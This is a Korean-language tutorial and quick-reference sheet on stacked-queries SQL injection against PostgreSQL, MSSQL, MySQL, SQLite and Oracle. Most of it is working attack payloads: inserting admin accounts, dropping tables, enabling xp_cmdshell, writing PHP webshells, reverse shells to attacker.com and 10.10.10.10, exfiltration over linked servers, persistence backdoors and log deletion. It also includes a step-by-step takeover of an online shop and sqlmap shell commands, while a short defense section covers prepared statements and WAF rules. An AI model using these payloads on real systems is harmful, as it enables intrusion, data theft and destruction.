Stacked Queries SQL Injection

Stacked Queries는 세미콜론(;)을 이용하여 여러 개의 SQL 쿼리를 순차적으로 실행할 수 있는 강력한 공격 기법입니다.

개념 (Concept)​

Stacked Queries란?​

**Stacked Queries (스택 쿼리)**는 하나의 SQL 문에서 세미콜론(;)으로 구분된 여러 쿼리를 연속 실행하는 기법입니다.

정상 쿼리:

SELECT * FROM products WHERE id=1

Stacked Queries:

SELECT * FROM products WHERE id=1; DROP TABLE users--

실행 결과:

  1. SELECT * FROM products WHERE id=1 실행
  2. DROP TABLE users 실행
  3. users 테이블 삭제

일반 SQLi vs Stacked Queries​

구분일반 SQLiStacked Queries
쿼리 개수1개 (기존 쿼리 수정)여러 개 (새 쿼리 추가)
가능한 작업SELECT, UNION모든 SQL (INSERT, UPDATE, DELETE, CREATE 등)
위험도중간매우 높음 (DB 완전 제어)
탐지비교적 쉬움어려움

지원 DBMS​

Stacked Queries 지원 여부:

DBMS기본 지원조건
PostgreSQL✅ 지원항상 가능
MSSQL✅ 지원항상 가능
MySQL⚠️ 제한적PHP mysqli_multi_query() 사용 시
Oracle⚠️ 제한적PL/SQL 블록 내에서만
SQLite✅ 지원항상 가능

PHP MySQL 예시:

# mysqli_query() - Stacked Queries 불가
$result = mysqli_query($conn, $query);  // 첫 번째 쿼리만 실행

# mysqli_multi_query() - Stacked Queries 가능
$result = mysqli_multi_query($conn, $query);  // 모든 쿼리 실행

기본 공격 기법​

1. 데이터 삽입 (INSERT)​

시나리오: 관리자 계정 추가

페이로드:

1; INSERT INTO users(username, password, role) VALUES('hacker', 'password123', 'admin')--

전체 쿼리:

SELECT * FROM products WHERE id=1; INSERT INTO users(username, password, role) VALUES('hacker', 'password123', 'admin')--

결과: 관리자 권한을 가진 hacker 계정 생성

2. 데이터 수정 (UPDATE)​

시나리오: 기존 관리자 비밀번호 변경

페이로드:

1; UPDATE users SET password='hacked123' WHERE username='admin'--

결과: admin 계정의 비밀번호가 hacked123으로 변경

3. 데이터 삭제 (DELETE)​

페이로드:

1; DELETE FROM products WHERE price > 1000--

결과: 1000원 이상 상품 모두 삭제

4. 테이블 삭제 (DROP TABLE)​

위험한 페이로드:

1; DROP TABLE users--

결과: users 테이블 완전 삭제 (복구 불가)

5. 시간 지연 (Time Delay)​

Blind SQLi 확인용:

MSSQL:

1; WAITFOR DELAY '00:00:05'--

PostgreSQL:

1; SELECT pg_sleep(5)--

MySQL (mysqli_multi_query 사용 시):

1; SELECT SLEEP(5)--

DBMS별 상세 기법​

PostgreSQL​

PostgreSQL은 Stacked Queries를 완벽하게 지원합니다.

기본 문법​

SELECT * FROM users WHERE id=1; SELECT version()

실전 페이로드​

1. 새로운 관리자 생성:

1; INSERT INTO users(username, password, role) VALUES('attacker', '5f4dcc3b5aa765d61d8327deb882cf99', 'admin')--

2. 백도어 테이블 생성:

1; CREATE TABLE backdoor (cmd VARCHAR(1000)); INSERT INTO backdoor VALUES ('SELECT version()')--

3. 함수 생성 (Reverse Shell):

1; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT--

4. 명령 실행:

1; SELECT system('nc attacker.com 4444 -e /bin/bash')--

5. 파일 읽기 (lo_import):

1; SELECT lo_import('/etc/passwd', 12345)--
1; SELECT lo_export(12345, '/tmp/passwd')--

6. COPY TO 데이터 추출:

1; COPY (SELECT * FROM users) TO '/tmp/users.txt'--

MSSQL (Microsoft SQL Server)​

MSSQL도 Stacked Queries 완전 지원:

xp_cmdshell 활성화 + 명령 실행​

# xp_cmdshell 활성화
1; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--

# 명령 실행
1; EXEC xp_cmdshell 'whoami'--
1; EXEC xp_cmdshell 'net user hacker password123 /add'--
1; EXEC xp_cmdshell 'net localgroup administrators hacker /add'--

시스템 정보 수집​

# OS 버전
1; CREATE TABLE ##temp (output VARCHAR(8000)); INSERT INTO ##temp EXEC xp_cmdshell 'systeminfo'--

# 네트워크 정보
1; EXEC xp_cmdshell 'ipconfig /all'--

# 사용자 목록
1; EXEC xp_cmdshell 'net user'--

데이터베이스 백업 생성​

1; BACKUP DATABASE master TO DISK='C:\inetpub\wwwroot\backup.bak'--

→ 웹 루트에 백업 파일 생성 후 다운로드

파일 쓰기​

1; EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php'--

MySQL​

MySQL은 기본적으로 Stacked Queries를 지원하지 않지만, mysqli_multi_query() 사용 시 가능:

mysqli_multi_query 확인​

취약한 PHP 코드:

<?php
$conn = mysqli_connect("localhost", "user", "pass", "db");
$id = $_GET['id'];

// Stacked Queries 가능
if (mysqli_multi_query($conn, "SELECT * FROM products WHERE id=$id")) {
    do {
        if ($result = mysqli_store_result($conn)) {
            while ($row = mysqli_fetch_array($result)) {
                print_r($row);
            }
            mysqli_free_result($result);
        }
    } while (mysqli_next_result($conn));
}
?>

공격 페이로드​

1. 새 사용자 추가:

1; INSERT INTO users(username, password) VALUES('hacker', MD5('password123'))--

2. 기존 데이터 수정:

1; UPDATE users SET password=MD5('hacked') WHERE username='admin'--

3. 시간 지연 (Blind 확인):

1; SELECT SLEEP(5)--

4. 데이터 추출 (INTO OUTFILE):

1; SELECT username, password FROM users INTO OUTFILE '/var/www/html/dump.txt'--

5. 웹셸 생성:

1; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--

제약 사항​

# mysqli_query() 사용 시 - Stacked Queries 불가
$result = mysqli_query($conn, $query);  // 세미콜론 이후 무시됨

SQLite​

SQLite도 Stacked Queries 지원:

# 기본 예시
SELECT * FROM users WHERE id=1; UPDATE users SET role='admin' WHERE id=1

# 테이블 생성
1; CREATE TABLE backdoor(data TEXT)--

# 데이터 삽입
1; INSERT INTO backdoor VALUES('hacked')--

Oracle​

Oracle은 PL/SQL 블록 내에서만 가능:

'; BEGIN
    INSERT INTO users VALUES('hacker', 'password');
    UPDATE users SET role='admin' WHERE username='hacker';
    COMMIT;
END;--

수동 공격 (Manual Exploitation)​

단계 1: Stacked Queries 지원 확인​

시간 지연 테스트​

MSSQL:

http://example.com/product?id=1; WAITFOR DELAY '00:00:05'--

→ 5초 지연 발생 시 Stacked Queries 지원

PostgreSQL:

http://example.com/product?id=1; SELECT pg_sleep(5)--

MySQL (mysqli_multi_query 필요):

http://example.com/product?id=1; SELECT SLEEP(5)--

에러 메시지 확인​

문법 오류 유발:

1; INVALID_SYNTAX--

지원 시:

SQL syntax error near 'INVALID_SYNTAX'

미지원 시:

정상 응답 (세미콜론 이후 무시됨)

단계 2: DBMS 식별​

# PostgreSQL
1; SELECT version()--

# MSSQL
1; SELECT @@version--

# MySQL
1; SELECT VERSION()--

단계 3: 권한 확인​

MSSQL - 현재 사용자 권한:

1; SELECT IS_SRVROLEMEMBER('sysadmin')--

PostgreSQL - Superuser 여부:

1; SELECT current_setting('is_superuser')--

MySQL:

1; SELECT USER(), CURRENT_USER()--

단계 4: 공격 실행​

시나리오 A: 관리자 계정 생성 (PostgreSQL)​

1. 현재 사용자 확인:

1; SELECT current_user--

2. 사용자 테이블 구조 확인:

1; SELECT column_name FROM information_schema.columns WHERE table_name='users'--

결과:

id
username
password
email
role

3. 비밀번호 해시 생성 (로컬):

echo -n "password123" | md5sum
# 출력: 482c811da5d5b4bc6d497ffa98491e38

4. 관리자 계정 삽입:

1; INSERT INTO users(username, password, email, role) VALUES('attacker', '482c811da5d5b4bc6d497ffa98491e38', 'attacker@evil.com', 'admin')--

5. 로그인 테스트:

  • Username: attacker
  • Password: password123

시나리오 B: xp_cmdshell RCE (MSSQL)​

1. xp_cmdshell 활성화 여부 확인:

1; SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS cmdshell_enabled FROM sys.configurations WHERE name = 'xp_cmdshell'--

2. 비활성화 시 활성화:

1; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--

3. 명령 실행 테스트:

1; EXEC xp_cmdshell 'whoami'--

출력 (Burp Suite Repeater 응답 확인):

nt authority\system

4. 관리자 계정 생성:

1; EXEC xp_cmdshell 'net user hacker P@ssw0rd123 /add'--
1; EXEC xp_cmdshell 'net localgroup administrators hacker /add'--

5. RDP 활성화:

1; EXEC xp_cmdshell 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'--

6. 방화벽 규칙 추가:

1; EXEC xp_cmdshell 'netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=in localport=3389 action=allow'--

7. RDP 접속:

rdesktop target_ip -u hacker -p P@ssw0rd123

시나리오 C: 웹셸 업로드 (MySQL)​

전제 조건:

  • mysqli_multi_query() 사용
  • FILE 권한 있음
  • 웹 루트 경로 알고 있음 (/var/www/html)

1. 웹셸 생성:

1; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--

2. 접근 테스트:

http://example.com/shell.php?cmd=id

출력:

uid=33(www-data) gid=33(www-data) groups=33(www-data)

3. Reverse Shell:

http://example.com/shell.php?cmd=nc 10.10.10.10 4444 -e /bin/bash

공격자 리스너:

nc -lvnp 4444

자동화 도구 (Automated Tools)​

SQLMap - Stacked Queries​

기본 스캔​

sqlmap -u "http://example.com/product?id=1" --technique=S --batch

출력:

[INFO] testing 'PostgreSQL > 8.1 stacked queries'
[INFO] GET parameter 'id' appears to be 'PostgreSQL > 8.1 stacked queries' injectable

OS Shell 획득 (MSSQL)​

sqlmap -u "URL" --technique=S --os-shell

대화형 세션:

os-shell> whoami
nt authority\system

os-shell> net user
Administrator
Guest
hacker

SQL Shell 획득​

sqlmap -u "URL" --technique=S --sql-shell

SQL 명령 실행:

sql-shell> SELECT user;
postgres

sql-shell> CREATE TABLE test(id INT);
Query OK, 0 rows affected

파일 읽기/쓰기​

파일 읽기:

sqlmap -u "URL" --technique=S --file-read="/etc/passwd"

파일 쓰기 (웹셸 업로드):

echo '<?php system($_GET["cmd"]); ?>' > shell.php
sqlmap -u "URL" --technique=S --file-write="shell.php" --file-dest="/var/www/html/shell.php"

데이터베이스 완전 장악​

# 1. 현재 DB 확인
sqlmap -u "URL" --technique=S --current-db

# 2. 모든 테이블 덤프
sqlmap -u "URL" --technique=S --dump-all

# 3. OS 명령 실행
sqlmap -u "URL" --technique=S --os-cmd="whoami"

# 4. Meterpreter 세션 (Metasploit)
sqlmap -u "URL" --technique=S --os-pwn --msf-path=/opt/metasploit-framework

고급 공격 기법​

1. Stored Procedure 악용 (MSSQL)​

사용자 정의 Stored Procedure 생성:

1; CREATE PROCEDURE backdoor AS EXEC xp_cmdshell 'net user hacker P@ssw0rd /add'--

나중에 실행:

1; EXEC backdoor--

2. Trigger 생성 (시간 지연 공격)​

PostgreSQL:

1; CREATE OR REPLACE FUNCTION backdoor() RETURNS TRIGGER AS $$
BEGIN
    PERFORM pg_sleep(10);
    RETURN NEW;
END;
$$ LANGUAGE plpgsql--

1; CREATE TRIGGER backdoor_trigger BEFORE INSERT ON products FOR EACH ROW EXECUTE FUNCTION backdoor()--

→ 상품 추가 시마다 10초 지연

3. 데이터베이스 링크 (MSSQL)​

원격 서버 연결:

1; EXEC sp_addlinkedserver @server='attacker_server', @srvproduct='', @provider='SQLNCLI', @datasrc='10.10.10.10'--

1; EXEC sp_addlinkedsrvlogin @rmtsrvname='attacker_server', @useself='False', @locallogin=NULL, @rmtuser='sa', @rmtpassword='password'--

# 데이터 전송
1; INSERT INTO attacker_server.db.dbo.stolen_data SELECT * FROM users--

4. 다단계 Stacked Queries​

여러 작업 한 번에 실행:

1; CREATE TABLE backdoor(cmd TEXT); INSERT INTO backdoor VALUES('SELECT version()'); UPDATE users SET role='admin' WHERE id=1; DELETE FROM logs WHERE date < '2026-01-01'--

5. Time-based + Stacked Queries 결합​

MSSQL:

1; IF (SELECT COUNT(*) FROM users WHERE username='admin')>0 WAITFOR DELAY '00:00:05'--

PostgreSQL:

1; SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE role='admin')>5 THEN pg_sleep(5) ELSE pg_sleep(0) END--

실전 공격 시나리오​

시나리오: E-commerce 웹사이트 완전 장악​

대상: 온라인 쇼핑몰 (MSSQL 사용)

취약점: 제품 검색 기능의 Stacked Queries

1. Stacked Queries 확인:

2. DBMS 버전 확인:

laptop'; CREATE TABLE ##version (v VARCHAR(100)); INSERT INTO ##version EXEC('SELECT @@version'); SELECT * FROM ##version--

응답:

Microsoft SQL Server 2019 (RTM) - 15.0.2000.5

3. 권한 확인:

laptop'; SELECT IS_SRVROLEMEMBER('sysadmin')--

응답: 1 (sysadmin 권한!)

Phase 2: 백도어 설치​

4. xp_cmdshell 활성화:

laptop'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--

5. 관리자 계정 생성:

laptop'; EXEC xp_cmdshell 'net user backdoor P@ssw0rd123! /add'; EXEC xp_cmdshell 'net localgroup administrators backdoor /add'--

6. RDP 활성화:

laptop'; EXEC xp_cmdshell 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'--

Phase 3: 데이터 추출​

7. 고객 데이터 백업:

laptop'; BACKUP DATABASE shop TO DISK='C:\inetpub\wwwroot\images\backup.bak'--

8. 백업 파일 다운로드:

http://shop.com/images/backup.bak

9. 로컬에서 복원:

# SQL Server Management Studio에서 복원
RESTORE DATABASE shop_stolen FROM DISK='backup.bak'

Phase 4: 지속성 확보​

10. Stored Procedure 백도어:

laptop'; CREATE PROCEDURE sp_backdoor @cmd VARCHAR(8000) AS EXEC xp_cmdshell @cmd--

나중에 실행:

1; EXEC sp_backdoor 'whoami'--

11. Trigger 백도어:

laptop'; CREATE TRIGGER backdoor_trigger ON users FOR INSERT AS BEGIN EXEC xp_cmdshell 'echo trigger_executed >> C:\log.txt' END--

Phase 5: 흔적 제거​

12. 로그 삭제:

laptop'; DELETE FROM sys.traces--
laptop'; EXEC xp_cmdshell 'del C:\Windows\System32\LogFiles\*.log /q'--

방어 기법​

1. Prepared Statements (필수)​

PHP (PDO):

$stmt = $pdo->prepare("SELECT * FROM products WHERE id = ?");
$stmt->execute([$_GET['id']]);

Java (JDBC):

PreparedStatement stmt = conn.prepareStatement("SELECT * FROM products WHERE id = ?");
stmt.setInt(1, productId);
ResultSet rs = stmt.executeQuery();

Python (psycopg2):

cursor.execute("SELECT * FROM products WHERE id = %s", (product_id,))

2. 세미콜론 필터링​

입력 검증:

if (strpos($_GET['id'], ';') !== false) {
    die("Invalid input");
}

화이트리스트 방식 (권장):

if (!ctype_digit($_GET['id'])) {
    die("ID must be numeric");
}

3. 최소 권한 원칙​

MSSQL - 읽기 전용 계정:

CREATE LOGIN webapp_user WITH PASSWORD = 'P@ssw0rd';
CREATE USER webapp_user FOR LOGIN webapp_user;

# SELECT 권한만 부여
GRANT SELECT ON products TO webapp_user;

xp_cmdshell 비활성화:

EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;

4. WAF (Web Application Firewall)​

ModSecurity 룰:

# 세미콜론 차단
SecRule ARGS "@rx ;" \
    "id:1005,phase:2,deny,status:403,msg:'Stacked Queries attempt'"

# WAITFOR DELAY 차단
SecRule ARGS "@rx WAITFOR\s+DELAY" \
    "id:1006,phase:2,deny,status:403,msg:'Time delay injection'"

5. 데이터베이스 방화벽​

네트워크 레벨 제한:

# iptables - DB 서버 아웃바운드 차단
iptables -A OUTPUT -p tcp --dport 80 -j DROP
iptables -A OUTPUT -p tcp --dport 443 -j DROP

6. 로그 모니터링​

이상 쿼리 탐지:

# PostgreSQL - 세미콜론 포함 쿼리 로깅
ALTER SYSTEM SET log_statement = 'all';
SELECT pg_reload_conf();

# 로그 분석
grep ";" /var/log/postgresql/postgresql.log | grep -i "insert\|update\|delete\|drop"

트러블슈팅 체크리스트​

Stacked Queries가 작동하지 않을 때​

  • DBMS가 Stacked Queries를 지원하는지 확인 (PostgreSQL, MSSQL, SQLite)
  • MySQL의 경우 mysqli_multi_query() 사용 여부 확인
  • WAF/IDS가 세미콜론을 차단하는지 확인
  • 애플리케이션이 첫 번째 쿼리 결과만 처리하는지 확인

두 번째 쿼리가 실행되지 않을 때​

  • 세미콜론 URL 인코딩 시도 (%3B)
  • 공백 문자 다양화 (+, %20, %09)
  • 주석 처리 확인 (--, #)
  • 에러 메시지로 실행 여부 판단

xp_cmdshell이 작동하지 않을 때 (MSSQL)​

  • xp_cmdshell이 활성화되어 있는지 확인
  • 현재 계정이 sysadmin 권한인지 확인
  • Windows 방화벽/AV가 차단하는지 확인
  • 대체 방법 시도 (OLE Automation, Agent Jobs)

파일 쓰기가 실패할 때​

  • FILE 권한이 있는지 확인 (MySQL)
  • secure_file_priv 설정 확인
  • 대상 디렉터리 쓰기 권한 확인
  • 웹 루트 경로 정확한지 확인

빠른 명령어 참조 (Quick Reference)​

취약점 확인​

# MSSQL
1; WAITFOR DELAY '00:00:05'--

# PostgreSQL
1; SELECT pg_sleep(5)--

# MySQL (mysqli_multi_query)
1; SELECT SLEEP(5)--

# SQLite
1; SELECT 1; SELECT 2--

DBMS 식별​

# PostgreSQL
1; SELECT version()--

# MSSQL
1; SELECT @@version--

# MySQL
1; SELECT VERSION()--

데이터 조작​

# INSERT
1; INSERT INTO users(username, password, role) VALUES('hacker', 'hash', 'admin')--

# UPDATE
1; UPDATE users SET password='hacked' WHERE username='admin'--

# DELETE
1; DELETE FROM logs WHERE date < '2026-01-01'--

# DROP TABLE (위험!)
1; DROP TABLE logs--

MSSQL - xp_cmdshell​

# 활성화
1; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--

# 명령 실행
1; EXEC xp_cmdshell 'whoami'--
1; EXEC xp_cmdshell 'net user hacker P@ssw0rd /add'--
1; EXEC xp_cmdshell 'net localgroup administrators hacker /add'--

PostgreSQL - RCE​

# 함수 생성
1; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT--

# 명령 실행
1; SELECT system('id')--
1; SELECT system('nc attacker.com 4444 -e /bin/bash')--

MySQL - 파일 작업​

# 데이터 추출
1; SELECT * FROM users INTO OUTFILE '/tmp/users.txt'--

# 웹셸 생성
1; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--

SQLMap​

# Stacked Queries 스캔
sqlmap -u "URL" --technique=S --batch

# OS Shell
sqlmap -u "URL" --technique=S --os-shell

# SQL Shell
sqlmap -u "URL" --technique=S --sql-shell

# 파일 쓰기 (웹셸)
sqlmap -u "URL" --technique=S --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# OS 명령 실행
sqlmap -u "URL" --technique=S --os-cmd="whoami"

# 전체 덤프
sqlmap -u "URL" --technique=S --dump-all
